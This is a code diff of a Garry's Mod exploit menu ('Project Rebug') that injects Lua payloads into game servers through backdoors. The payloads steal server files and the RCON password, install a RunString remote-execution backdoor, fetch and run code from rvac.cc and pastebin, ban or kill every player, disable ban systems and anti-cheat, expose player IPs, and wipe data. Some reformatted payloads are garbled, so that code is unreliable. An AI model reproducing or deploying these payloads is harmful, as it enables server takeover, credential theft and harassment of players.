@@ -910,7 +910,6 @@ File Stealer ( BD Required )
 
             rebug.AddButtonBIG("File Downloader", item8, function()
                 surface.PlaySound("buttons/button18.wav")
-
                 Derma_StringRequest("Steal File Source", "File Path (Relative to garrysmod/)", "", function(text)
                     net.Receive("file", function(len)
                         local str = net.ReadString()
@@ -923,20 +922,25 @@ File Stealer ( BD Required )
                     end)
 
                     noob.PostLua([[
+					
 					util.AddNetworkString( "file" )
 					local id = ]] .. LocalPlayer():UserID() .. [[
-					local f = file.Open( "]] .. text .. [[", "r", "GAME" )
-					if !f then 
-					net.Start( "file" )
-					net.WriteString( "ERROR" )
-					net.Send( Player( id ) )
-					return 
+					local f = file.Open("]] .. text .. [[", "r", "GAME")
+
+					if not f then
+						net.Start("file")
+						net.WriteString("ERROR")
+						net.Send(Player(id))
+
+						return
 					end
-					local str = f:Read( f:Size() )
+
+					local str = f:Read(f:Size())
 					f:Close()
-					net.Start( "file" )
-					net.WriteString( str )
-					net.Send( Player( id ) )
+					net.Start("file")
+					net.WriteString(str)
+					net.Send(Player(id))
+					
 				]])
                 end)
             end)
@@ -1488,7 +1492,7 @@ Panels 2 : backdoors :)
         copy.DoClick = function()
             surface.PlaySound("buttons/button18.wav")
             rprint(" Copied! LuaRun or place inside addon")
-            SetClipboardText('util.AddNetworkString("\x52\x45\x42\x55\x47")net.Receive("\x52\x45\x42\x55\x47"),function()RunString(net.ReadString())end)')
+            SetClipboardText('util.AddNetworkString("REBUG")net.Receive("REBUG"),function()RunString(net.ReadString())end)')
         end
 
         local bhop = vgui.Create("DButton", VoidPlate)
@@ -1542,30 +1546,50 @@ Panels 2 : backdoors :)
         -- Backdoor 1
         rebug.AddButton("@Inject SendLua Interface", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[util.AddNetworkString ('REBUG') net.Receive ('REBUG', function (length, ply) local netString = net.ReadString () local bit = net.ReadBit () if bit == 1 then RunString (netString) else game.ConsoleCommand (netString ..'\n') end end)]])
+            noob.PostLua([[
+
+				util.AddNetworkString('REBUG')
+
+				net.Receive('REBUG', function(length, ply)
+					local netString = net.ReadString()
+					local bit = net.ReadBit()
+
+					if bit == 1 then
+						RunString(netString)
+					else
+						game.ConsoleCommand(netString .. '\n')
+					end
+				end)
+
+			]])
         end)
 
         rebug.AddButton("Artillery Server Strike", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[if !bombstrike then
-				hook.Add("Think", "lulz_bombstrike", function()
-				local explode = ents.Create("env_explosion")
-				local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))
-				local trc = {}
-				trc.start = ps
-				trc.endpos = ps + Vector(0, 0, -99999)
-				local tr = util.TraceLine(trc)
-				if !tr.Hit then return end
-				explode:SetPos(tr.HitPos)
-				explode:Spawn()
-				explode:SetKeyValue("iMagnitude", "400")
-				explode:Fire("Explode", 0, 0)
+            noob.PostLua([[
+			
+				if not bombstrike then
+					hook.Add("Think", "lulz_bombstrike", function()
+					local explode = ents.Create("env_explosion")
+					local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))
+					local trc = {}
+					trc.start = ps
+					trc.endpos = ps + Vector(0, 0, -99999)
+					local tr = util.TraceLine(trc)
+					if not tr.Hit then return end
+					explode:SetPos(tr.HitPos)
+					explode:Spawn()
+					explode:SetKeyValue("iMagnitude", "400")
+					explode:Fire("Explode", 0, 0)
 				end)
+
 				bombstrike = true
-				else
+			else
 				hook.Remove("Think", "lulz_bombstrike")
 				bombstrike = false
-				end]])
+			end
+			
+			]])
         end)
 
         rebug.AddButton("Announce centre screen", Bar1, function()
@@ -1577,52 +1601,66 @@ Panels 2 : backdoors :)
 
         rebug.AddButton("Broken Glass Symphony", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[if !timer.Exists("A true masterpiece") then
-				timer.Create("A true masterpiece", 0.2, 0, function()
-				for _, p in pairs(player.GetAll()) do
-				p:EmitSound("physics/glass/glass_largesheet_break"..math.random(1,3)..".wav", 100, math.random(40, 180))
-				end
+            noob.PostLua([[
+			
+				if not timer.Exists("A true masterpiece") then
+					timer.Create("A true masterpiece", 0.2, 0, function()
+						for _, p in pairs(player.GetAll()) do
+						p:EmitSound("physics/glass/glass_largesheet_break" .. math.random(1, 3) .. ".wav", 100, math.random(40, 180))
+					end
 				end)
-				else
+			else
 				timer.Remove("A true masterpiece")
-				end]])
+			end
+			
+			]])
         end)
 
         rebug.AddButton("Double Or Nothing", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("Set win chance", "1-100", "", function(str)
-                noob.PostLua("BDON_CONFIG.doubleChance = " .. str)
+                noob.PostLua("BDON_CONFIG.doubleChance =" .. str)
             end)
         end)
 
+
+        rebug.AddButton("Bitminer2 Amount Value", Bar1, function()
+            surface.PlaySound("buttons/button18.wav")
+            Derma_StringRequest("Bitminer2 Amount Value", "Set the value of how much bitminer2 give", "", function(str)
+                noob.PostLua("BM2CONFIG.BitcoinValue =" .. str)
+            end)
+        end)
 
         rebug.AddButton("Ban All Players", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("Ban All Players", "Reason", "", function(text)
-                noob.PostLua([[local id = ]] .. LocalPlayer():UserID() .. [[
-					for k, v in next, player.GetAll() do
-					if v:UserID() == id then continue end
-					v:Ban( 0, false )
-					v:Kick( "]] .. tostring(text) .. [[" )
-					end]])
-            end)
-        end)
+                noob.PostLua([[
 
-        rebug.AddButton("Bitminer 2 Value", Bar1, function()
-            surface.PlaySound("buttons/button18.wav")
-            Derma_StringRequest("Bitminer 2 Value", "Set how much bitminer2 makes", function(str)
-                noob.PostLua("BM2CONFIG.BitcoinValue = " .. str)
+				local id = ]] .. LocalPlayer():UserID() .. [[
+				
+					for k, v in next, player.GetAll() do
+						if v:UserID() == id then continue end
+							v:Ban( 0, false )
+							v:Kick( "]] .. tostring(text) .. [[" )
+						end
+
+					]])
             end)
         end)
 
         rebug.AddButton("Break Economy", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[for k,v in pairs(player.GetAll()) do v:addMoney(9999999999) end]])
+            noob.PostLua([[
+			
+			for k,v in pairs(player.GetAll()) do v:addMoney(9999999999) end
+			
+			]])
         end)
 
         rebug.AddButton("Custom Job", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
 			noob.PostLua([[
+
 			TEAM_]]..noobstr..[[ = DarkRP.createJob("Project Rebug", {
 				model = "models/player/skeleton.mdl",
 				weapons = {"weapon_stunstick", "unarrest_stick", "m9k_glock", "m9k_dbarrel", "m9k_usas", "m9k_barret_m82", "m9k_svu", "m9k_acr", "m9k_vector", "m9k_m202", "m9k_milkormgl", "lockpick", "pro_lockpick", "staff_lockpick"},
@@ -1643,332 +1681,516 @@ Panels 2 : backdoors :)
 					ply:SetArmor(10000)
 				end,
 				})
+
 			]]) rprint('Job Command: /'..noobstr)
 		end)
 
         rebug.AddButton("Cleanup Map", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[game.CleanUpMap()]])
+            noob.PostLua([[
+			
+			game.CleanUpMap()
+			
+			]])
         end)
 
         rebug.AddButton("Console Jammer", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[if !(timer.Exists("consoleJammer")) then
-				timer.Create("consoleJammer", 0.5, 0, function()
-				print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
+            noob.PostLua([[
+			
+				if not (timer.Exists("Block_")) then
+					timer.Create("Block_", 0.5, 0, function()
+					print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
 				end)
-				else
-				timer.Destroy("consoleJammer")
-				end]])
+			else
+				timer.Destroy("Block_")
+			end
+			
+			]])
         end)
 
         rebug.AddButton("Change Everyone Name", Bar1, function()
             Derma_StringRequest("Set Everyones Name", "Name", "", function(text)
-                noob.PostLua([[local str = "]] .. text .. [["
-					for k, v in next, player.GetAll() do
-					DarkRP.storeRPName( v, str )
-					v:setDarkRPVar( "rpname", str )
-					end]])
+                noob.PostLua([[
+				
+				local str = "]] .. text .. [["
+
+				for k, v in next, player.GetAll() do
+					DarkRP.storeRPName(v, str)
+					v:setDarkRPVar("rpname", str)
+				end
+				
+				]])
             end)
         end)
 
         rebug.AddButton("Change All Model", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("Change Everyones Model", "Model Directory", "", function(str)
-                noob.PostLua("for k, v in pairs(player.GetAll()) do v:SetModel(\"" .. str .. "\") end")
+                noob.PostLua([[
+				
+				for k, v in pairs(player.GetAll()) do v:SetModel(]]..str..[[) end
+				
+				]])
             end)
         end)
 
         rebug.AddButton("Change All Material", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("Set Everythings Material", "Material Directory", "", function(str)
-                noob.PostLua("for k, v in pairs(ents.GetAll()) do v:SetMaterial(\"" .. str .. "\") end")
+                noob.PostLua([[
+				
+				for k, v in pairs(ents.GetAll()) do v:SetMaterial(]]..str..[[) end
+				
+				]])
             end)
         end)
 
         rebug.AddButton("Disable Bans/Kicks", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[if ULib then
-				function ULib.kick( ply, reason, calling_ply ) end
-				function ULib.ban( ply, time, reason, admin ) end
-				function ULib.addBan( steamid, time, reason, name, admin ) end
+            noob.PostLua([[
+			
+				if ULib then
+					function ULib.kick(ply, reason, calling_ply)
+					end
+
+					function ULib.ban(ply, time, reason, admin)
+					end
+
+					function ULib.addBan(steamid, time, reason, name, admin)
+					end
 				end
+
 				if FAdmin then
-				local function no(ply) end
-				FAdmin.Commands.AddCommand("kick", no)
-				FAdmin.Commands.AddCommand("ban", no)
-				FAdmin.Commands.AddCommand("jail", no)
-				FAdmin.Commands.AddCommand("UnJail", no)
-				FAdmin.Commands.AddCommand("ClearDecals", no)
-				FAdmin.Commands.AddCommand("StopSounds", no)
-				FAdmin.Commands.AddCommand("CleanUp", no)
+					local function no(ply)
+					end
+
+					FAdmin.Commands.AddCommand("kick", no)
+					FAdmin.Commands.AddCommand("ban", no)
+					FAdmin.Commands.AddCommand("jail", no)
+					FAdmin.Commands.AddCommand("UnJail", no)
+					FAdmin.Commands.AddCommand("ClearDecals", no)
+					FAdmin.Commands.AddCommand("StopSounds", no)
+					FAdmin.Commands.AddCommand("CleanUp", no)
 				end
+
 				local _R = debug.getregistry()
-				function _R.Player.Ban(ply, r) end
-				function _R.Player.Kick(ply, r) end
-				function game.KickID(id, reason) end
+
+				function _R.Player.Ban(ply, r)
+				end
+
+				function _R.Player.Kick(ply, r)
+				end
+
+				function game.KickID(id, reason)
+				end
+
 				local RCM = RunConsoleCommand
+
 				function RunConsoleCommand(command, ...)
-				if command == "addip" then return end
-				RCM(command, ...)
-				end]])
+					if command == "addip" then return end
+					RCM(command, ...)
+				end
+			]])
         end)
 
         rebug.AddButton("Disable SNTE", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[local function Check(func)
-				if string.find(debug.getinfo(func).short_src,"snte_source.lua") then
-				return true
+            noob.PostLua([[
+			
+			local function Check(func)
+				if string.find(debug.getinfo(func).short_src, "snte_source.lua") then
+					return true
 				else
-				return false
+					return false
 				end
+			end
+
+			timer.Create("fucksnte", 5, 0, function()
+				for k, v in pairs(net.Receivers) do
+					if Check(v) then
+						net.Receive(k, function(l, ply)
+							ply:ChatPrint("LEL")
+						end)
+					end
 				end
-				timer.Create("fucksnte",5,0,function()
-				for k,v in pairs(net.Receivers) do
-				if Check(v) then
-				net.Receive(k,function(l,ply)
-				ply:ChatPrint("LEL")
-				end)
-				end
-				end
-				end)]])
+			end)
+			
+			]])
 		end)
 
         rebug.AddButton("Disable Exit", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)]])
+            noob.PostLua([[
+			
+			hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
+			
+			]])
         end)
 
-        rebug.AddButton("DarkRP Starting Money", Bar1, function()
-          surface.PlaySound("buttons/button18.wav")
-          Derma_StringRequest("DarkRP Starting Money", "Set starting money amount", "", function(str)
-        noob.PostLua("GM.Config.startingmoney = " ..str)
-           end)
+        rebug.AddButton("DarkRP Start Cash", Bar1, function()
+            surface.PlaySound("buttons/button18.wav")
+            noob.PostLua([[
+			
+			GM.Config.startingmoney = ]]..str..[[ 
+			
+			]])
         end)
-
 
         rebug.AddButton("Earthquake", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[if !timer.Exists("earthquake") then
-				timer.Create("earthquake", 0.5, 500, function()
-				for _, p in pairs(player.GetAll()) do
-				p:SetPos(p:GetPos() + Vector(0, 0, 1))
-				p:SetVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150)))
-				util.ScreenShake(p:GetPos(), 20, 1, 1, 100)
-				p:EmitSound("ambient/explosions/exp1.wav", 100, math.random(60, 100))
-				end
-				for _, e in pairs(ents.GetAll()) do
-				if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150))) end
-				end
-				end)
+            noob.PostLua([[
+			
+				if not timer.Exists("earthquake") then
+					timer.Create("earthquake", 0.5, 500, function()
+						for _, p in pairs(player.GetAll()) do
+							p:SetPos(p:GetPos() + Vector(0, 0, 1))
+							p:SetVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150)))
+							util.ScreenShake(p:GetPos(), 20, 1, 1, 100)
+							p:EmitSound("ambient/explosions/exp1.wav", 100, math.random(60, 100))
+						end
+
+						for _, e in pairs(ents.GetAll()) do
+							if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then
+								e:GetPhysicsObject():AddVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150)))
+							end
+						end
+					end)
 				else
-				timer.Remove("earthquake")
-				end]])
+					timer.Remove("earthquake")
+				end
+				
+				]])
         end)
 
         rebug.AddButton("EarRape", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua("for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end")
+            noob.PostLua([[
+			
+			for k,v in pairs(player.GetAll()) do v:EmitSound("npc/stalker/go_alert2a.wav", 100, 100 ) end
+			
+			]])
         end)
 
         rebug.AddButton("Enigma Disco", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[http.Fetch("https://rvac.cc/load/b1g.lua", function(b) RunString(b) end )]])
+            noob.PostLua([[
+			
+			http.Fetch("https://rvac.cc/load/b1g.lua", function(b) RunString(b) end )
+			
+			]])
         end)
 
         rebug.AddButton("Enigma Disco 2.0", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[http.Fetch("https://rvac.cc/load/xd.lua", function(b) RunString(b) end )]])
+            noob.PostLua([[
+			
+			http.Fetch("https://rvac.cc/load/xd.lua", function(b) RunString(b) end )
+			
+			]])
         end)
 
         rebug.AddButton("Hell Mode", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1',function(b,l,h,c)RunString(b)end,nil)")]])
+            noob.PostLua([[
+			
+			BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1',function(b,l,h,c)RunString(b)end,nil)")
+			
+			]])
         end)
 
         rebug.AddButton("Ignite Everyone", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-
             Derma_StringRequest("Ignite All Players", "Lenght In Seconds", "", function(str)
-                noob.PostLua("for k, v in pairs(player.GetAll()) do v:Ignite(" .. str .. ") end")
+                noob.PostLua([[
+				
+				for k, v in pairs(player.GetAll()) do v:Ignite(]]..str..[[) end
+				
+				]])
             end)
         end)
 
         rebug.AddButton("Kill Everyone", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua("for k,v in pairs(player.GetAll()) do v:Kill() end")
+            noob.PostLua([[
+			
+			for k,v in pairs(player.GetAll()) do v:Kill() end
+			
+			]])
         end)
 
         rebug.AddButton("Luarun Access", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun")]])
+            noob.PostLua([[
+			
+			RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun")
+			
+			]])
         end)
 
         rebug.AddButton("Launch Players", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua("for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end")
+            noob.PostLua([[
+			
+			for k, v in pairs(player.GetAll()) do
+				v:SetVelocity(v:GetVelocity() + Vector(math.random(1000, 5000), math.random(1000, 5000), math.random(1000, 5000)))
+			end
+			
+			]])
         end)
 
         rebug.AddButton("LuaRun Code", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-
             Derma_StringRequest("LuaRun String", "String", "", function(text)
-                noob.PostLua([[RunString( ']] .. text .. [[' )]])
+                noob.PostLua([[
+				
+				RunString( ']]..text..[[' )
+				
+				]])
             end)
         end)
 
         rebug.AddButton("Rainbow Physgun", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[hook.Add("Think", "rainbowphysgun", function()
-				for k,ply in ipairs(player.GetAll()) do
-				local col = HSVToColor(CurTime() % 6 * 60, 1, 1)
-				ply:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
-				end end)]])
+            noob.PostLua([[
+			
+			hook.Add("Think", "rainbowphysgun", function()
+				for k, ply in ipairs(player.GetAll()) do
+					local col = HSVToColor(CurTime() % 6 * 60, 1, 1)
+					ply:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
+				end
+			end)
+
+			]])
         end)
 
         rebug.AddButton("Rainbow Chat Spam", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("Rainbow Chatspam", "Text", "", function(text)
-                noob.PostLua([[chat = 0{}
-					function chat.AddText(...)
-					net.Start("REBUG")
-					net.WriteTable({...})
-					net.Broadcast()
-					end
-					function AddTextPly(ply, ...)
-					net.Start("REBUG")
-					net.WriteTable({...})
-					net.Send(ply)
-					end
-					for k, v in pairs(player.GetAll()) do
-					v:SendLua('net.Receive("REBUG", function(len) chat.AddText(unpack(net.ReadTable()))end)')
-					end
-					timer.Create("gotEm", 0.8, 120, function()
-					local function ChatPrintRainbow(frequency, str)
-					local text = {}
-					for i = 1, #str do
-					table.insert(text, HSVToColor(i * frequency % 360, 1, 1))
-					table.insert(text, string.sub(str, i, i))
-					end
-					chat.AddText(unpack(text))
-					end
-					ChatPrintRainbow(10, "]] .. text .. [[")
-					end)]])
+                noob.PostLua([[
+				
+					chat = 0
+
+					return {}, chat.AddText(...), net.Start("REBUG"), net.WriteTable({...}), net.Broadcast(), AddTextPly(ply, ...), net.Start("REBUG"), net.WriteTable({...}), net.Send(ply), v, pairs(player.GetAll()), v:SendLua('net.Receive("REBUG", function(len) chat.AddText(unpack(net.ReadTable()))end)'), timer.Create("gotEm", 0.8, 120, function()
+						local function ChatPrintRainbow(frequency, str)
+							local text = {}
+
+							for i = 1, #str do
+								table.insert(text, HSVToColor(i * frequency % 360, 1, 1))
+								table.insert(text, string.sub(str, i, i))
+							end
+
+							chat.AddText(unpack(text))
+						end
+
+						ChatPrintRainbow(10, "]] .. text .. [[")
+					end)				
+				
+				]])
             end)
         end)
 
         rebug.AddButton("Rainbow HUD", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[if !rainbowscreen then
-				BroadcastLua("hook.Add('HUDPaint', 'rainbowscreen', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 100)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")
-				rainbowscreen = true
+            noob.PostLua([[
+			
+				if not rainbowscreen then
+					BroadcastLua("hook.Add('HUDPaint', 'rainbowscreen', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 100)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")
+					rainbowscreen = true
 				else
-				BroadcastLua("hook.Remove('HUDPaint', 'rainbowscreen')")
-				rainbowscreen = false
-				end]])
+					BroadcastLua("hook.Remove('HUDPaint', 'rainbowscreen')")
+					rainbowscreen = false
+				end
+			
+			]])
         end)
 
         rebug.AddButton("Rainbow Everything", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[BroadcastLua("http.Fetch('https://pastebin.com/raw/gCG1pSNK',function(b,l,h,c)RunString(b)end,nil)")]])
+            noob.PostLua([[
+
+			BroadcastLua("http.Fetch('https://pastebin.com/raw/gCG1pSNK',function(b,l,h,c)RunString(b)end,nil)")
+
+			]])
             rprint("This may cause frame drop")
         end)
 
         rebug.AddButton("Remove Bans", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[if file.Exists("ulib/bans.txt", "DATA") then file.Delete("ulib/bans.txt") end]])
+            noob.PostLua([[
+
+			if file.Exists("ulib/bans.txt", "DATA") then
+				file.Delete("ulib/bans.txt")
+			end
+
+			]])
         end)
 
         rebug.AddButton("Rave Music", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua("BroadcastLua([[surface.PlaySound('music/hl1_song25_remix3.mp3')]])")
+            noob.PostLua([[
+
+			BroadcastLua("surface.PlaySound('music/hl1_song25_remix3.mp3')")
+
+			]])
         end)
 
         rebug.AddButton("Moan Steps", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[if !moanstep then
-				hook.Add("PlayerFootstep", "oooh", function(ply)
-				ply:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
-				end)
-				moanstep = true
+            noob.PostLua([[
+
+				if not moanstep then
+					hook.Add("PlayerFootstep", "oooh", function(ply)
+						ply:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
+					end)
+
+					moanstep = true
 				else
-				hook.Remove("PlayerFootstep", "oooh")
-				moanstep = false
-				end]])
+					hook.Remove("PlayerFootstep", "oooh")
+					moanstep = false
+				end
+
+			]])
         end)
 
         rebug.AddButton("Open URL On Players", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("URL On Players", "URL Link", "", function(str)
-                noob.PostLua([==[local ply = str
-					ply:SendLua([[h=vgui.Create("DHTML")
-					h:SetSize(ScrW(),ScrH())
-					h:OpenURL(..str..)]])
+                noob.PostLua([==[
+
+				local ply = str
+					ply:SendLua([[
+					h = vgui.Create("DHTML")
+					h:SetSize(ScrW(), ScrH())
+					h:OpenURL()
+					]])
+
 					]==])
             end)
         end)
 
         rebug.AddButton("Explode all vehicles", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then
-				local explo = ents.Create("env_explosion")
-				explo:SetPos(v:GetPos())
-				explo:SetKeyValue("iMagnitude", "300")
-				explo:Spawn()
-				explo:Activate()
-				explo:Fire("Explode", "", 0)
+            noob.PostLua([[
+			
+				for k, v in pairs(ents.GetAll()) do
+					if v:IsVehicle() then
+						local explo = ents.Create("env_explosion")
+						explo:SetPos(v:GetPos())
+						explo:SetKeyValue("iMagnitude", "300")
+						explo:Spawn()
+						explo:Activate()
+						explo:Fire("Explode", "", 0)
+					end
 				end
-				end]])
+			
+			]])
         end)
 
         rebug.AddButton("Print All IP's", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[local id = ]] .. LocalPlayer():UserID() .. [[
-				for k, v in pairs( player.GetAll() ) do
-				Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )
-				end]])
+            noob.PostLua([[
+
+			local id = ]] .. LocalPlayer():UserID() .. [[
+				for k, v in pairs(player.GetAll()) do
+					Player(id):ChatPrint("Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress())
+				end
+
+				]])
         end)
 
         rebug.AddButton("Toggle all doors", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end]])
+            noob.PostLua([[
+			
+			local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"}
+
+			for k, v in pairs(ents.GetAll()) do
+				if table.HasValue(doors, v:GetClass()) then
+					v:Fire("toggle", "", 0)
+				end
+			end
+			
+			]])
         end)
 
         rebug.AddButton("Lock all doors", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("lock", "", 0) end end]])
+            noob.PostLua([[
+			
+			local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"}
+
+			for k, v in pairs(ents.GetAll()) do
+				if table.HasValue(doors, v:GetClass()) then
+					v:Fire("lock", "", 0)
+				end
+			end
+			
+			]])
         end)
 
         rebug.AddButton("Unlock all doors", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]])
+            noob.PostLua([[
+			
+			local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"}
+
+			for k, v in pairs(ents.GetAll()) do
+				if table.HasValue(doors, v:GetClass()) then
+					v:Fire("unlock", "", 0)
+				end
+			end
+			
+			]])
         end)
 
         rebug.AddButton("Vaporize all players", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[for k, v in pairs(player.GetAll()) do v:Remove() end]])
+            noob.PostLua([[
+
+				for k, v in pairs(player.GetAll()) do
+					v:Remove()
+				end
+
+			]])
         end)
 
         rebug.AddButton("WhiteList Everything", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[if FPP then
-				for k,v in pairs(FPP.Blocked) do
-				for r,g in pairs(v) do
-				RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)
+            noob.PostLua([[
+
+				if FPP then
+					for k, v in pairs(FPP.Blocked) do
+						for r, g in pairs(v) do
+							RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)
+						end
+					end
 				end
-				end
-				end]])
+
+			]])
         end)
 
         rebug.AddButton("Wipe data folder", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[local files, directories = file.Find("*", "DATA") for k, v in pairs(files) do file.Delete(v) end]])
+            noob.PostLua([[
+			
+			local files, directories = file.Find("*", "DATA")
+
+			for k, v in pairs(files) do
+				file.Delete(v)
+			end
+			
+			]])
         end)
 
         rebug.AddButton("ULX Unban SteamID", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("ULX Unban SteamID", "SteamID", "", function(str)
-                noob.PostLua([[ULib.unban("]]..str..[[")]])
+                noob.PostLua([[
+				
+				ULib.unban("]]..str..[[")
+				
+				]])
             end)
         end)
 
@@ -2043,43 +2265,51 @@ Panels 3 : RCON Backdoors
         -- RCON Backdoors
         rebug.AddButton("Rcon Stealer", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[util.AddNetworkString("rvac.rcon_passw_dump")
+            noob.PostLua([[
+			
+				util.AddNetworkString("rvac.rcon_passw_dump")
 				util.AddNetworkString("REBUG")
 				util.AddNetworkString("rvac.aucun_rcon_ici")
-				net.Receive( "REBUG", function()
-				local RconPassword
-				if file.Exists("cfg/server.cfg", "GAME") then
-				for k, v in pairs(string.Explode("\n", file.Read("cfg/server.cfg", "GAME"))) do
-					if string.find(v, "rcon_password") then
-					RconPassword = v
-					end
-					end
-					end
-				if not RconPassword and file.Exists("cfg/autoexec.cfg", "GAME") then
-					for k, v in pairs(string.Explode("\n", file.Read("cfg/autoexec.cfg", "GAME"))) do
-					if string.find(v, "rcon_password") then
-					RconPassword = v
-					end
-					end
-					end
-				if RconPassword ~= nil then
-					net.Start("rvac.rcon_passw_dump")
-					net.WriteString(RconPassword)
-					net.Broadcast()
-					else
-					net.Start("rvac.aucun_rcon_ici")
-					net.Broadcast()
-					end
-					end)]])
 
-            timer.Simple(0.5, function()
-                if CheckIfStringExists("REBUG") then
-                    net.Start("REBUG")
-                    net.SendToServer()
-                else
-                    chat.AddText(Color(255, 0, 0), "RCON password not found, try again")
-                end
-            end)
+				net.Receive("REBUG", function()
+					local RconPassword
+
+					if file.Exists("cfg/server.cfg", "GAME") then
+						for k, v in pairs(string.Explode("\n", file.Read("cfg/server.cfg", "GAME"))) do
+							if string.find(v, "rcon_password") then
+								RconPassword = v
+							end
+						end
+					end
+
+					if not RconPassword and file.Exists("cfg/autoexec.cfg", "GAME") then
+						for k, v in airs(string.Explode("\n", file.Read("cfg/autoexec.cfg", "GAME"))) do
+							if string.find(v, "rcon_password") then
+								RconPassword = v
+							end
+						end
+					end
+
+					if RconPassword ~= nil then
+						net.Start("rvac.rcon_passw_dump")
+						net.WriteString(RconPassword)
+						net.Broadcast()
+					else
